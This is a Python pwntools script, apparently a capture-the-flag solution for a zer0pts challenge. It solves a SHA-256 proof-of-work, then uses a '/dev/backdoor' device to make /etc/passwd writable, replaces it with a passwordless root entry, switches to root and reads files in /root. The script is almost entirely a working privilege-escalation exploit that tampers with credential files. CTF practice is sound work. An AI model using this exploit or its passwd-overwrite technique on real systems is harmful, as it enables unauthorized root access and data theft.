import itertools
import hashlib
import string
from pwn import *

def calc_hash(suffix, hashval):
    table = string.ascii_letters + string.digits + "._"

    for v in itertools.product(table, repeat=4):
        if hashlib.sha256((''.join(v) + suffix).encode()).hexdigest() == hashval:
            print("[+] Prefix = " + ''.join(v))
            return ''.join(v)
            break
    else:
        print("[-] Solution not found :thinking_face:")
        return -1

def exec_cmd(cmd):
    r.recvuntil("$ ")
    r.sendline(cmd)


r = remote("others.ctf.zer0pts.com", 11011)

PoW = r.recvline(keepends=False).decode("utf-8").split(" = ")
hashval = PoW[1]
suffix = PoW[0].split("????")[1].split("\"")[0]
prefix = calc_hash(suffix, hashval)
r.sendline(prefix)

exec_cmd("echo \"b4ckd00r:/etc/passwd:511\" > /dev/backdoor")
exec_cmd("echo \"root::0:0:root:/root:/bin/sh\" > /etc/passwd")
exec_cmd("su")
r.sendlineafter("# ", "cat /root/*")

r.interactive()

